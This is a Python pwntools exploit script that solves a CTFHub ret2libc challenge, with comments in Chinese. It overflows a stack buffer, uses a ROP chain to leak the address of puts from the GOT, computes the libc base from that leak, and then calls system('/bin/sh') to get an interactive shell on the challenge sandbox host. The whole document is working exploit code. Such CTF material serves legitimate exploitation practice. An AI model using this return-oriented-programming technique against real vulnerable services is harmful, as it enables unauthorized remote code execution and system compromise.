# ctfhub ret2libc
"""
远程是 libc6_2.23-0ubuntu11.3_amd64
本地是 libc6_2.23-0ubuntu11.2_amd64
https://libc.blukat.me/ 查的 bin_sh值
"""
from pwn import *

context.arch = 'amd64'
io = remote('challenge-13106b67e4ff008a.sandbox.ctfhub.com', '29200')
e = ELF('ret2libc')

main_addr = e.symbols['main']
puts_plt = e.symbols["puts"]
puts_got = e.got["puts"]
pop_rdi_ret = 0x0400703

junk = 'a' * (144 + 8)

payload = flat(junk, pop_rdi_ret, puts_got, puts_plt, main_addr)
io.sendlineafter(" ctfhub", payload)

puts_addr = io.recvuntil(b'\x7f')[-6:]
puts_addr = unpack(puts_addr.ljust(8, b'\x00'))  # 地址是6bytes, 补到8位unpack
success(hex(puts_addr))

libc = ELF('./libc.so')
libc.address = puts_addr - libc.sym["puts"]
system = libc.sym["system"]
bin_sh = libc.address + 0x18ce57
success(hex(bin_sh))

ret = 0x00004004c9

payload = flat(junk, ret, pop_rdi_ret, bin_sh, system)  # ubuntu64需要栈对齐, 加个ret
io.sendlineafter(" ctfhub", payload)
io.sendline(payload)

io.interactive()